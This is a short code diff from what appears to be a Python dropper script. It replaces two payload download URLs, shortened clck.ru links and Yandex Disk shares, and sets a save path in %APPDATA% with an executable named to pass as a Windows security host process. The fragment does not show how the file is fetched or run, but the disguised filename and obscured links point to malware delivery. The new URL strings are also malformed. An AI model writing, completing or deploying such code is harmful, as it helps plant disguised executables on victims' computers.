@@ -3,8 +3,8 @@ import threading
 import requests
 import ctypes
 
-URL1 = "https://clck.ru/3TSRbV"
-URL2 = "https://clck.ru/3TSRZm"
+URL1 = "https://disk.yandex.ru/d/LKMHBcx3aNleBQ,  https://clck.ru/3TSyjV"
+URL2 = "https://disk.yandex.ru/d/OcN0JcljLJtP5Q, : https://clck.ru/3TSyf6"
 
 APP_DATA = os.getenv('APPDATA')
 PATH1 = os.path.join(APP_DATA, "Microsoft", "Windows", "Windows.Security.Host.Container.Runtime.exe")
